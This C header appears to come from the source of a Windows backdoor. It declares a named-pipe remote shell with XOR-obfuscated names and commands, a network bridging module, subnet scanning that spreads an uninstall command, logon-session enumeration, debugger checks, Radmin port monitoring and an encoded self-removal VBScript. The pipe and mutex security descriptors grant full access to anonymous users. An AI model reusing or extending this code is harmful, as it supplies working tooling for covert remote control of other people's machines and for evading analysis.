//===================ShellPipe Module========================
//#define WORKING_MUTEX "Global\\e3a157358785392834dfc5b1cf225c5192e91a76"
unsigned char WORKING_MUTEX[49]={
	0x0A,  0x21,  0x22,  0x2F,  0x2C,  0x21,  0x11,  0x28,
	0x7E,  0x2C,  0x7C,  0x78,  0x7A,  0x7E,  0x78,  0x75,
	0x7A,  0x75,  0x78,  0x7E,  0x74,  0x7F,  0x75,  0x7E,
	0x79,  0x29,  0x2B,  0x2E,  0x78,  0x2F,  0x7C,  0x2E,
	0x2B,  0x7F,  0x7F,  0x78,  0x2E,  0x78,  0x7C,  0x74,
	0x7F,  0x28,  0x74,  0x7C,  0x2C,  0x7A,  0x7B,  0x4D
};

//#define UNLOAD_MUTEX "Global\\d2baa5bdb3375af0372f3fc92eb05faaa9427d34"
unsigned char UNLOAD_MUTEX[48]={
 0x0A,  0x21,  0x22,  0x2F,  0x2C,  0x21,  0x11,  0x29,
 0x7F,  0x2F,  0x2C,  0x2C,  0x78,  0x2F,  0x29,  0x2F,
 0x7E,  0x7E,  0x7A,  0x78,  0x2C,  0x2B,  0x7D,  0x7E,
 0x7A,  0x7F,  0x2B,  0x7E,  0x2B,  0x2E,  0x74,  0x7F,
 0x28,  0x2F,  0x7D,  0x78,  0x2B,  0x2C,  0x2C,  0x2C,
 0x74,  0x79,  0x7F,  0x7A,  0x29,  0x7E,  0x79,  0x4D
};

//#define NAME_PIPE "\\\\.\\pipe\\abcf62ddfbb3b8302ea3fe63e8eb58aa4de0954b"
unsigned char NAME_PIPE[50]={
 0x11,  0x11,  0x63,  0x11,  0x3D,  0x24,  0x3D,  0x28,
 0x11,  0x2C,  0x2F,  0x2E,  0x2B,  0x7B,  0x7F,  0x29,
 0x29,  0x2B,  0x2F,  0x2F,  0x7E,  0x2F,  0x75,  0x7E,
 0x7D,  0x7F,  0x28,  0x2C,  0x7E,  0x2B,  0x28,  0x7B,
 0x7E,  0x28,  0x75,  0x28,  0x2F,  0x78,  0x75,  0x2C,
 0x2C,  0x79,  0x29,  0x28,  0x7D,  0x74,  0x78,  0x79,
 0x2F,  0x4D
};

#define THREAD_UNLOAD_MUTEX "D402E2902F670AC12E1AC591472E1F8C3C0DE90B"
#define MAX_ACCEPT_CONNECTIONS 256

#define BUFFER_SEND_FILE 65535
#define BUFFER_INOUT_NAMEDPIPE 0

//#define FILENAME_EXECUTE_APP "775E56283FE4F895C079BDB81A2EA21E51BD856E"
unsigned char FILENAME_EXECUTE_APP[41]={
 0x7A,  0x7A,  0x78,  0x08,  0x78,  0x7B,  0x7F,  0x75,
 0x7E,  0x0B,  0x08,  0x79,  0x0B,  0x75,  0x74,  0x78,
 0x0E,  0x7D,  0x7A,  0x74,  0x0F,  0x09,  0x0F,  0x75,
 0x7C,  0x0C,  0x7F,  0x08,  0x0C,  0x7F,  0x7C,  0x08,
 0x78,  0x7C,  0x0F,  0x09,  0x75,  0x78,  0x7B,  0x08,
 0x4D
};

#ifndef INVALID_SET_FILE_POINTER
#define INVALID_SET_FILE_POINTER ((DWORD)-1)
#endif

typedef struct __BRIDGE_PARAMS{
	char *localip;
	int localport;
	char* remoteip;
	int remoteport;
	LPSTR *arrayAcceptRemoteIPFDQN;
	int narrayAcceptRemoteIPFDQN;
}BRIDGE_PARAMS, *LPBRIDGE_PARAMS;

HANDLE hWorkingMutex = NULL, hUnloadMutex = NULL;
HANDLE hNamedPipe = NULL;
HINSTANCE hInstance;
LPSTR *lpArrayCmdLine = NULL;
DWORD dwLenArrayCmdLine;
HANDLE hThreadMonitor = NULL;

CHAR procSIPath[MAX_PATH+4]={0};

CHAR FILE_ORIG_UPGRADE[MAX_PATH+4]={0};

int WaitTimeOutExecuteApp=20000;

HANDLE hThreadBridged = NULL;
BRIDGE_PARAMS bridgeParams;

BOOL DataPacketIsEncrypted=FALSE;

#define NUM_MACROS 11
LPSTR lpMacros[NUM_MACROS]={
	"\x2E\x38\x20\x4D", //"cum",
	"\x38\x23\x21\x22\x2C\x29\x20\x28\x4D", //"unloadme",
	"\x2A\x24\x23\x2B\x4D", //"ginf", 
	"\x3E\x28\x39\x39\x24\x20\x28\x22\x38\x39\x4D", //"settimeout",
	"\x2E\x29\x4D", //"cd",
	"\x28\x23\x2C\x2F\x21\x28\x2F\x4D", //"enableb",
	"\x29\x24\x3E\x2C\x2F\x21\x28\x2F\x4D", //"disableb",
	"\x2A\x2F\x21\x22\x2A\x3E\x4D", //"gblogs",
	"\x38\x23\x24\x23\x3E\x39\x2C\x21\x21\x4D", //"uninstall",
	"\x3E\x3A\x24\x39\x2E\x25\x4D", //"switch",
	"\x38\x3D\x2A\x3F\x2C\x29\x28\x4D", //"upgrade"
};

#define PIPE_STRING_SECURITY_DESCRIPTOR "D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;LA) \
(A;;FA;;;WD)(A;;FA;;;AN)(A;;FA;;;NU)(A;;FA;;;AU)(A;;FA;;;BG)(A;;FA;;;BO) \
(A;;FA;;;BU)(A;;FA;;;IU)(A;;FA;;;LG)(A;;FA;;;LS)(A;;FA;;;NS)(A;;FA;;;PS) \
(A;;FA;;;RD)(A;;FA;;;RC)(A;;FA;;;SU)"

#define MUTEX_STRING_SECURITY_DESCRIPTOR "D:(A;;GA;;;SY)(A;;GA;;;BA)(A;;GA;;;LA) \
(A;;GA;;;WD)(A;;GA;;;AN)(A;;GA;;;NU)(A;;GA;;;AU)(A;;GA;;;BG)(A;;GA;;;BO) \
(A;;GA;;;BU)(A;;GA;;;IU)(A;;GA;;;LG)(A;;GA;;;LS)(A;;GA;;;NS)(A;;GA;;;PS) \
(A;;GA;;;RD)(A;;GA;;;RC)(A;;GA;;;SU)"

typedef BOOL (WINAPI *lpfCreateProcessWithLogonW)(LPCWSTR lpUsername,
  LPCWSTR lpDomain,
  LPCWSTR lpPassword,
  DWORD dwLogonFlags,
  LPCWSTR lpApplicationName,
  LPWSTR lpCommandLine,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCWSTR lpCurrentDirectory,
  LPSTARTUPINFOW lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInfo
);

typedef BOOL (WINAPI *lpfConvertStringSecurityDescriptorToSecurityDescriptor)(
	LPCTSTR StringSecurityDescriptor,
	DWORD StringSDRevision,
	PSECURITY_DESCRIPTOR* SecurityDescriptor,
	PULONG SecurityDescriptorSize
);

BOOL CreateUnloadMutex(HANDLE);
VOID UnloadDLL(void);
BOOL ReadLineFromPipe(HANDLE hPipe, LPSTR *Buffer);
DWORD WriteToPipe(HANDLE hPipe, DWORD cbSize, LPSTR Buffer, DWORD dwFlags);
DWORD WriteLineToPipe(HANDLE hPipe, LPSTR Buffer);
BOOL ExecuteApp(LPSTR lpCmdLine, HANDLE hPipe, BOOL waitForOutput, BOOL Interactive, LPSTR lpUserName, LPSTR lpPasswordm, BOOL IgnoreInteractiveError = TRUE);
DWORD ShellPipe(HANDLE hPipe);
BOOL ServerShellPipe(void);
DWORD CheckMutex(LPVOID lpParam);
BOOL RasInfoEntry(HANDLE hPipe, LPSTR lpRasEntryName);
DWORD Macro_GetInfo(HANDLE hPipe, LPSTR lpEntryName);
DWORD Macro_SetTimeOut(HANDLE hPipe, LPSTR lpszWaitTimeout);
DWORD Macro_SetCD(HANDLE hPipe, LPSTR lpPath);
DWORD Macro_EnableBridged(HANDLE hPipe);
DWORD Macro_DisableBridged(HANDLE hPipe);
DWORD Macro_GetBridgedLogs(HANDLE hPipe);
DWORD ProccesMacro(HANDLE hPipe, LPSTR cmdLine);

lpfConvertStringSecurityDescriptorToSecurityDescriptor ConvertStringSecurityDescriptorToSecurityDescriptor;
lpfCreateProcessWithLogonW CreateProcessWithLogonW=NULL;

//===================Bridged Module========================
bool get_main_args(char *localip, int localport, char* remoteip, int remoteport);
bool create_bridged_unload_mutex();
int cnt_to_serv(char *ip, int port);
void exit_bridge_proc(int code);
int bridge_proc(int sck_client);
int create_thread(LPVOID lpFunc, DWORD Param);
int thread_init_bridged(LPBRIDGE_PARAMS lpBridgeParam);
bool check_is_accept_remote_host(LPBRIDGE_PARAMS bridgeParam, in_addr client_addr);
LPSTR pop_log_record();
void push_log_record(LPSTR szEntry);
void unload_bridged(DWORD exitcode);

////===================Unistall Module========================
#define MAX_ARRAY_REMOVABLE_DRIVES 256
//#define FILE_NAME_UNISTALL_FILE "58130bb5201e66ca9f926c0a297d8aea7e0e9fd777422517487a685fa09bab91"
unsigned char FILE_NAME_UNISTALL_FILE[65]={
 0x78,  0x75,  0x7C,  0x7E,  0x7D,  0x2F,  0x2F,  0x78,
 0x7F,  0x7D,  0x7C,  0x28,  0x7B,  0x7B,  0x2E,  0x2C,
 0x74,  0x2B,  0x74,  0x7F,  0x7B,  0x2E,  0x7D,  0x2C,
 0x7F,  0x74,  0x7A,  0x29,  0x75,  0x2C,  0x28,  0x2C,
 0x7A,  0x28,  0x7D,  0x28,  0x74,  0x2B,  0x29,  0x7A,
 0x7A,  0x7A,  0x79,  0x7F,  0x7F,  0x78,  0x7C,  0x7A,
 0x79,  0x75,  0x7A,  0x2C,  0x7B,  0x75,  0x78,  0x2B,
 0x2C,  0x7D,  0x74,  0x2F,  0x2C,  0x2F,  0x74,  0x7C,
 0x4D
};
#define CMD_UNISTALL_NO_REMOTE "uninstall false"

LPSTR* GetRemovableDrives(LPDWORD dwCount);
BOOL ExistsUnistallerFile();
BOOL SendRemoteUnistallCommand(in_addr remoteAddr);
BOOL ScanSubNetAndNotifyUnistall(in_addr localAddr);
BOOL RemoteUnistallProc();
BOOL UnistallProc(BOOL Remote, BOOL IsUpgrade);
DWORD ThreadCheckUnistallFile(LPVOID lpParam);

////===================Check App Run As User Module========================
typedef struct _SECURITY_LOGON_SESSION_DATA {  
	ULONG Size;  
	LUID LogonId;  
	LSA_UNICODE_STRING UserName;  
	LSA_UNICODE_STRING LogonDomain;  
	LSA_UNICODE_STRING AuthenticationPackage;  
	SECURITY_LOGON_TYPE LogonType;
	ULONG Session;  
	PSID Sid;  
	LARGE_INTEGER LogonTime;  
	LSA_UNICODE_STRING LogonServer;  
	LSA_UNICODE_STRING DnsDomainName;  
	LSA_UNICODE_STRING Upn;
} SECURITY_LOGON_SESSION_DATA,  *PSECURITY_LOGON_SESSION_DATA;

typedef NTSTATUS (NTAPI *lpLsaEnumerateLogonSessions)(PULONG LogonSessionCount,	PLUID* LogonSessionList);
typedef NTSTATUS (NTAPI *lpLsaGetLogonSessionData)(PLUID LogonId, PSECURITY_LOGON_SESSION_DATA* ppLogonSessionData);
typedef DWORD (WINAPI *lpGetModuleFileNameEx)(HANDLE hProcess, HMODULE hModule, LPTSTR lpFilename, DWORD nSize);

lpLsaEnumerateLogonSessions LsaEnumerateLogonSessions;
lpLsaGetLogonSessionData LsaGetLogonSessionData;
lpGetModuleFileNameEx GetModuleFileNameEx;

////===================Exception Module========================
typedef BOOL (WINAPI *lpfIsDebuggerPresent)(void);
lpfIsDebuggerPresent IsDebuggerPresent=NULL;

////===================ICMP Module========================
#define IPAddr in_addr

typedef struct ip_option_information {  
	UCHAR Ttl;  
	UCHAR Tos;  
	UCHAR Flags;  
	UCHAR OptionsSize;  
	PUCHAR OptionsData;
} IP_OPTION_INFORMATION,  *PIP_OPTION_INFORMATION;

typedef struct icmp_echo_reply {  
	IPAddr Address;  
	ULONG Status;  
	ULONG RoundTripTime;  
	USHORT DataSize;  
	USHORT Reserved;  
	PVOID Data;  
	struct ip_option_information Options;
} ICMP_ECHO_REPLY,  *PICMP_ECHO_REPLY;

typedef HANDLE (WINAPI *lpfIcmpCreateFile)(void);
typedef DWORD (WINAPI *lpfIcmpSendEcho) (HANDLE IcmpHandle,
	IPAddr DestinationAddress,
	LPVOID RequestData,
	WORD RequestSize,
	PIP_OPTION_INFORMATION RequestOptions,
	LPVOID ReplyBuffer,
	DWORD ReplySize,
	DWORD Timeout
);
typedef BOOL (WINAPI *lpfIcmpCloseHandle)(HANDLE IcmpHandle);

lpfIcmpCreateFile IcmpCreateFile=NULL;
lpfIcmpSendEcho IcmpSendEcho=NULL;
lpfIcmpCloseHandle IcmpCloseHandle=NULL;

//======================Package Module======================
typedef HRESULT (__stdcall *lpfHashData) (LPBYTE pbData, DWORD cbData, LPBYTE pbHash,DWORD cbHash);
lpfHashData HashData=NULL;

//======================TCPMonitor Module======================
#ifndef ANY_SIZE
#define ANY_SIZE 1
#endif

#define MIB_TCP_STATE_ESTAB 5

#define RADMIN30_DEFAULT_LISTEN_PORT 4899

typedef struct _MIB_TCPROW {  
	DWORD dwState;  
	DWORD dwLocalAddr;  
	DWORD dwLocalPort;  
	DWORD dwRemoteAddr;  
	DWORD dwRemotePort;
} MIB_TCPROW,  *PMIB_TCPROW;

typedef struct _MIB_TCPTABLE {  
	DWORD dwNumEntries;  
	MIB_TCPROW table[ANY_SIZE];
} MIB_TCPTABLE,  *PMIB_TCPTABLE;

typedef DWORD (WINAPI *lpfGetTcpTable) (
	PMIB_TCPTABLE pTcpTable,
	PDWORD pdwSize,
	BOOL bOrder
);

lpfGetTcpTable GetTcpTable=NULL;

//======================Unistall VBScript======================
unsigned char VBS_SCRIPT_CODE_UNISTALL[1382]={
 0x0B,  0x38,  0x23,  0x2E,  0x39,  0x24,  0x22,  0x23, 

 0x6D,  0x38,  0x3D,  0x2A,  0x3F,  0x65,  0x0F,  0x34, 

 0x1B,  0x2C,  0x21,  0x6D,  0x2B,  0x3D,  0x02,  0x3F, 

 0x24,  0x2A,  0x61,  0x6D,  0x0F,  0x34,  0x1B,  0x2C, 

 0x21,  0x6D,  0x2B,  0x3D,  0x09,  0x28,  0x3E,  0x39, 

 0x64,  0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x02, 

 0x23,  0x6D,  0x08,  0x3F,  0x3F,  0x22,  0x3F,  0x6D, 

 0x1F,  0x28,  0x3E,  0x38,  0x20,  0x28,  0x6D,  0x03, 

 0x28,  0x35,  0x39,  0x40,  0x47,  0x6D,  0x6D,  0x6D, 

 0x6D,  0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x3E, 

 0x28,  0x39,  0x6D,  0x2B,  0x3E,  0x22,  0x6D,  0x70, 

 0x6D,  0x0E,  0x3F,  0x28,  0x2C,  0x39,  0x28,  0x02, 

 0x2F,  0x27,  0x28,  0x2E,  0x39,  0x65,  0x6F,  0x1E, 

 0x2E,  0x3F,  0x24,  0x3D,  0x39,  0x24,  0x23,  0x2A, 

 0x63,  0x0B,  0x24,  0x21,  0x28,  0x1E,  0x34,  0x3E, 

 0x39,  0x28,  0x20,  0x02,  0x2F,  0x27,  0x28,  0x2E, 

 0x39,  0x6F,  0x64,  0x40,  0x47,  0x6D,  0x6D,  0x6D, 

 0x6D,  0x2B,  0x3E,  0x22,  0x63,  0x0E,  0x22,  0x3D, 

 0x34,  0x0B,  0x24,  0x21,  0x28,  0x6D,  0x2B,  0x3D, 

 0x02,  0x3F,  0x24,  0x2A,  0x61,  0x6D,  0x2B,  0x3D, 

 0x09,  0x28,  0x3E,  0x39,  0x61,  0x6D,  0x19,  0x3F, 

 0x38,  0x28,  0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D, 

 0x24,  0x2B,  0x6D,  0x28,  0x3F,  0x3F,  0x6D,  0x39, 

 0x25,  0x28,  0x23,  0x40,  0x47,  0x6D,  0x6D,  0x6D, 

 0x6D,  0x6D,  0x6D,  0x6D,  0x6D,  0x38,  0x3D,  0x2A, 

 0x3F,  0x6D,  0x70,  0x6D,  0x0B,  0x2C,  0x21,  0x3E, 

 0x28,  0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x6D, 

 0x6D,  0x6D,  0x6D,  0x28,  0x35,  0x24,  0x39,  0x6D, 

 0x2B,  0x38,  0x23,  0x2E,  0x39,  0x24,  0x22,  0x23, 

 0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x28,  0x23, 

 0x29,  0x6D,  0x24,  0x2B,  0x40,  0x47,  0x6D,  0x6D, 

 0x6D,  0x6D,  0x38,  0x3D,  0x2A,  0x3F,  0x6D,  0x70, 

 0x6D,  0x19,  0x3F,  0x38,  0x28,  0x40,  0x47,  0x08, 

 0x23,  0x29,  0x6D,  0x0B,  0x38,  0x23,  0x2E,  0x39, 

 0x24,  0x22,  0x23,  0x40,  0x47,  0x40,  0x47,  0x0B, 

 0x38,  0x23,  0x2E,  0x39,  0x24,  0x22,  0x23,  0x6D, 

 0x3F,  0x3E,  0x2B,  0x65,  0x0F,  0x34,  0x1B,  0x2C, 

 0x21,  0x6D,  0x2B,  0x24,  0x21,  0x28,  0x1D,  0x2C, 

 0x39,  0x25,  0x64,  0x40,  0x47,  0x6D,  0x6D,  0x6D, 

 0x6D,  0x02,  0x23,  0x6D,  0x08,  0x3F,  0x3F,  0x22, 

 0x3F,  0x6D,  0x1F,  0x28,  0x3E,  0x38,  0x20,  0x28, 

 0x6D,  0x03,  0x28,  0x35,  0x39,  0x40,  0x47,  0x6D, 

 0x6D,  0x6D,  0x6D,  0x09,  0x24,  0x20,  0x6D,  0x2B, 

 0x3E,  0x22,  0x61,  0x6D,  0x2B,  0x29,  0x61,  0x6D, 

 0x24,  0x61,  0x6D,  0x2F,  0x61,  0x6D,  0x23,  0x23, 

 0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x1E,  0x28, 

 0x39,  0x6D,  0x2B,  0x3E,  0x22,  0x6D,  0x70,  0x6D, 

 0x0E,  0x3F,  0x28,  0x2C,  0x39,  0x28,  0x02,  0x2F, 

 0x27,  0x28,  0x2E,  0x39,  0x65,  0x6F,  0x1E,  0x2E, 

 0x3F,  0x24,  0x3D,  0x39,  0x24,  0x23,  0x2A,  0x63, 

 0x0B,  0x24,  0x21,  0x28,  0x1E,  0x34,  0x3E,  0x39, 

 0x28,  0x20,  0x02,  0x2F,  0x27,  0x28,  0x2E,  0x39, 

 0x6F,  0x64,  0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D, 

 0x1E,  0x28,  0x39,  0x6D,  0x2B,  0x24,  0x21,  0x28, 

 0x6D,  0x70,  0x6D,  0x2B,  0x3E,  0x22,  0x63,  0x0A, 

 0x28,  0x39,  0x0B,  0x24,  0x21,  0x28,  0x65,  0x2B, 

 0x24,  0x21,  0x28,  0x1D,  0x2C,  0x39,  0x25,  0x64, 

 0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x2B,  0x3E, 

 0x24,  0x37,  0x28,  0x6D,  0x70,  0x6D,  0x2B,  0x24, 

 0x21,  0x28,  0x63,  0x3E,  0x24,  0x37,  0x28,  0x40, 

 0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x1E,  0x28,  0x39, 

 0x6D,  0x2B,  0x29,  0x6D,  0x70,  0x6D,  0x2B,  0x3E, 

 0x22,  0x63,  0x02,  0x3D,  0x28,  0x23,  0x19,  0x28, 

 0x35,  0x39,  0x0B,  0x24,  0x21,  0x28,  0x65,  0x2B, 

 0x24,  0x21,  0x28,  0x1D,  0x2C,  0x39,  0x25,  0x61, 

 0x6D,  0x7F,  0x61,  0x6D,  0x0B,  0x2C,  0x21,  0x3E, 

 0x28,  0x61,  0x6D,  0x60,  0x7F,  0x64,  0x40,  0x47, 

 0x6D,  0x6D,  0x6D,  0x6D,  0x24,  0x2B,  0x6D,  0x28, 

 0x3F,  0x3F,  0x6D,  0x39,  0x25,  0x28,  0x23,  0x40, 

 0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x6D,  0x6D,  0x6D, 

 0x6D,  0x3F,  0x3E,  0x2B,  0x6D,  0x70,  0x6D,  0x0B, 

 0x2C,  0x21,  0x3E,  0x28,  0x40,  0x47,  0x6D,  0x6D, 

 0x6D,  0x6D,  0x6D,  0x6D,  0x6D,  0x6D,  0x28,  0x35, 

 0x24,  0x39,  0x6D,  0x2B,  0x38,  0x23,  0x2E,  0x39, 

 0x24,  0x22,  0x23,  0x40,  0x47,  0x6D,  0x6D,  0x6D, 

 0x6D,  0x28,  0x23,  0x29,  0x6D,  0x24,  0x2B,  0x40, 

 0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x1F,  0x2C,  0x23, 

 0x29,  0x22,  0x20,  0x24,  0x37,  0x28,  0x6D,  0x05, 

 0x22,  0x38,  0x3F,  0x65,  0x03,  0x22,  0x3A,  0x64, 

 0x6D,  0x67,  0x6D,  0x00,  0x24,  0x23,  0x38,  0x39, 

 0x28,  0x65,  0x03,  0x22,  0x3A,  0x64,  0x6D,  0x67, 

 0x6D,  0x1E,  0x28,  0x2E,  0x22,  0x23,  0x29,  0x65, 

 0x03,  0x22,  0x3A,  0x64,  0x40,  0x47,  0x6D,  0x6D, 

 0x6D,  0x6D,  0x2B,  0x22,  0x3F,  0x6D,  0x24,  0x6D, 

 0x70,  0x6D,  0x7C,  0x6D,  0x39,  0x22,  0x6D,  0x2B, 

 0x3E,  0x24,  0x37,  0x28,  0x40,  0x47,  0x6D,  0x6D, 

 0x6D,  0x6D,  0x6D,  0x6D,  0x6D,  0x6D,  0x2B,  0x29, 

 0x63,  0x3A,  0x3F,  0x24,  0x39,  0x28,  0x6D,  0x0E, 

 0x25,  0x3F,  0x65,  0x0E,  0x04,  0x23,  0x39,  0x65, 

 0x1F,  0x23,  0x29,  0x6D,  0x67,  0x6D,  0x7F,  0x78, 

 0x78,  0x64,  0x64,  0x40,  0x47,  0x6D,  0x6D,  0x6D, 

 0x6D,  0x23,  0x28,  0x35,  0x39,  0x40,  0x47,  0x6D, 

 0x6D,  0x6D,  0x6D,  0x2B,  0x29,  0x63,  0x0E,  0x21, 

 0x22,  0x3E,  0x28,  0x40,  0x47,  0x6D,  0x6D,  0x6D, 

 0x6D,  0x2F,  0x70,  0x6F,  0x6F,  0x40,  0x47,  0x6D, 

 0x6D,  0x6D,  0x6D,  0x2B,  0x22,  0x3F,  0x6D,  0x24, 

 0x70,  0x7D,  0x6D,  0x39,  0x22,  0x6D,  0x7C,  0x7B, 

 0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x6D,  0x6D, 

 0x6D,  0x6D,  0x24,  0x2B,  0x6D,  0x24,  0x70,  0x7C, 

 0x7D,  0x6D,  0x39,  0x25,  0x28,  0x23,  0x77,  0x6D, 

 0x2F,  0x6D,  0x70,  0x6D,  0x2F,  0x6D,  0x6B,  0x6D, 

 0x6F,  0x63,  0x6F,  0x40,  0x47,  0x6D,  0x6D,  0x6D, 

 0x6D,  0x6D,  0x6D,  0x6D,  0x6D,  0x2F,  0x6D,  0x70, 

 0x6D,  0x2F,  0x6D,  0x6B,  0x6D,  0x0E,  0x1E,  0x39, 

 0x3F,  0x65,  0x0E,  0x04,  0x23,  0x39,  0x65,  0x1F, 

 0x23,  0x29,  0x6D,  0x67,  0x6D,  0x7F,  0x78,  0x7B, 

 0x64,  0x64,  0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D, 

 0x23,  0x28,  0x35,  0x39,  0x40,  0x47,  0x6D,  0x6D, 

 0x6D,  0x6D,  0x2B,  0x24,  0x21,  0x28,  0x63,  0x03, 

 0x2C,  0x20,  0x28,  0x6D,  0x70,  0x6D,  0x2F,  0x40, 

 0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x2B,  0x24,  0x21, 

 0x28,  0x63,  0x09,  0x28,  0x21,  0x28,  0x39,  0x28, 

 0x65,  0x19,  0x3F,  0x38,  0x28,  0x64,  0x40,  0x47, 

 0x6D,  0x6D,  0x6D,  0x6D,  0x3F,  0x3E,  0x2B,  0x6D, 

 0x70,  0x6D,  0x19,  0x3F,  0x38,  0x28,  0x40,  0x47, 

 0x08,  0x23,  0x29,  0x6D,  0x0B,  0x38,  0x23,  0x2E, 

 0x39,  0x24,  0x22,  0x23,  0x40,  0x47,  0x40,  0x47, 

 0x1E,  0x28,  0x39,  0x6D,  0x22,  0x2F,  0x27,  0x0C, 

 0x3F,  0x2A,  0x3E,  0x6D,  0x70,  0x6D,  0x1A,  0x1E, 

 0x2E,  0x3F,  0x24,  0x3D,  0x39,  0x63,  0x0C,  0x3F, 

 0x2A,  0x38,  0x20,  0x28,  0x23,  0x39,  0x3E,  0x40, 

 0x47,  0x04,  0x2B,  0x6D,  0x22,  0x2F,  0x27,  0x0C, 

 0x3F,  0x2A,  0x3E,  0x63,  0x0E,  0x22,  0x38,  0x23, 

 0x39,  0x6D,  0x70,  0x6D,  0x7D,  0x6D,  0x39,  0x25, 

 0x28,  0x23,  0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D, 

 0x1A,  0x3E,  0x2E,  0x3F,  0x24,  0x3D,  0x39,  0x63, 

 0x1C,  0x38,  0x24,  0x39,  0x6D,  0x7D,  0x40,  0x47, 

 0x28,  0x23,  0x29,  0x6D,  0x24,  0x2B,  0x40,  0x47, 

 0x40,  0x47,  0x2B,  0x3D,  0x6D,  0x70,  0x6D,  0x22, 

 0x2F,  0x27,  0x0C,  0x3F,  0x2A,  0x3E,  0x65,  0x7D, 

 0x64,  0x40,  0x47,  0x2B,  0x3D,  0x38,  0x3D,  0x2A, 

 0x3F,  0x6D,  0x70,  0x6D,  0x6F,  0x6F,  0x40,  0x47, 

 0x24,  0x2B,  0x6D,  0x22,  0x2F,  0x27,  0x0C,  0x3F, 

 0x2A,  0x3E,  0x63,  0x0E,  0x22,  0x38,  0x23,  0x39, 

 0x6D,  0x70,  0x6D,  0x7F,  0x6D,  0x39,  0x25,  0x28, 

 0x23,  0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x2B, 

 0x3D,  0x38,  0x3D,  0x2A,  0x3F,  0x6D,  0x70,  0x6D, 

 0x22,  0x2F,  0x27,  0x0C,  0x3F,  0x2A,  0x3E,  0x65, 

 0x7C,  0x64,  0x40,  0x47,  0x28,  0x23,  0x29,  0x6D, 

 0x24,  0x2B,  0x40,  0x47,  0x40,  0x47,  0x2B,  0x22, 

 0x3F,  0x6D,  0x24,  0x70,  0x7D,  0x6D,  0x39,  0x22, 

 0x6D,  0x74,  0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D, 

 0x24,  0x2B,  0x6D,  0x3F,  0x3E,  0x2B,  0x65,  0x2B, 

 0x3D,  0x64,  0x70,  0x19,  0x3F,  0x38,  0x28,  0x6D, 

 0x39,  0x25,  0x28,  0x23,  0x77,  0x6D,  0x28,  0x35, 

 0x24,  0x39,  0x6D,  0x2B,  0x22,  0x3F,  0x40,  0x47, 

 0x6D,  0x6D,  0x6D,  0x6D,  0x1A,  0x1E,  0x2E,  0x3F, 

 0x24,  0x3D,  0x39,  0x63,  0x1E,  0x21,  0x28,  0x28, 

 0x3D,  0x6D,  0x7E,  0x7D,  0x7D,  0x7D,  0x40,  0x47, 

 0x23,  0x28,  0x35,  0x39,  0x40,  0x47,  0x40,  0x47, 

 0x24,  0x2B,  0x6D,  0x2B,  0x3D,  0x38,  0x3D,  0x2A, 

 0x3F,  0x6D,  0x71,  0x73,  0x6D,  0x6F,  0x6F,  0x6D, 

 0x39,  0x25,  0x28,  0x23,  0x40,  0x47,  0x6D,  0x6D, 

 0x6D,  0x6D,  0x38,  0x3D,  0x2A,  0x3F,  0x6D,  0x2B, 

 0x3D,  0x38,  0x3D,  0x2A,  0x3F,  0x61,  0x6D,  0x2B, 

 0x3D,  0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x2B, 

 0x22,  0x3F,  0x6D,  0x24,  0x70,  0x7D,  0x6D,  0x39, 

 0x22,  0x6D,  0x7E,  0x40,  0x47,  0x6D,  0x6D,  0x6D, 

 0x6D,  0x6D,  0x6D,  0x6D,  0x6D,  0x24,  0x2B,  0x6D, 

 0x3F,  0x3E,  0x2B,  0x65,  0x2B,  0x3D,  0x38,  0x3D, 

 0x2A,  0x3F,  0x64,  0x6D,  0x70,  0x6D,  0x19,  0x3F, 

 0x38,  0x28,  0x6D,  0x39,  0x25,  0x28,  0x23,  0x77, 

 0x6D,  0x28,  0x35,  0x24,  0x39,  0x6D,  0x2B,  0x22, 

 0x3F,  0x40,  0x47,  0x6D,  0x6D,  0x6D,  0x6D,  0x6D, 

 0x6D,  0x6D,  0x6D,  0x1A,  0x1E,  0x2E,  0x3F,  0x24, 

 0x3D,  0x39,  0x63,  0x1E,  0x21,  0x28,  0x28,  0x3D, 

 0x6D,  0x7E,  0x7D,  0x7D,  0x7D,  0x40,  0x47,  0x6D, 

 0x6D,  0x6D,  0x6D,  0x23,  0x28,  0x35,  0x39,  0x40, 

 0x47,  0x28,  0x23,  0x29,  0x6D,  0x24,  0x2B,  0x40, 

 0x47,  0x3F,  0x3E,  0x2B,  0x6D,  0x1A,  0x1E,  0x2E, 

 0x3F,  0x24,  0x3D,  0x39,  0x63,  0x1E,  0x2E,  0x3F, 

 0x24,  0x3D,  0x39,  0x0B,  0x38,  0x21,  0x21,  0x03, 

 0x2C,  0x20,  0x28,  0x40,  0x47,  0x4D

};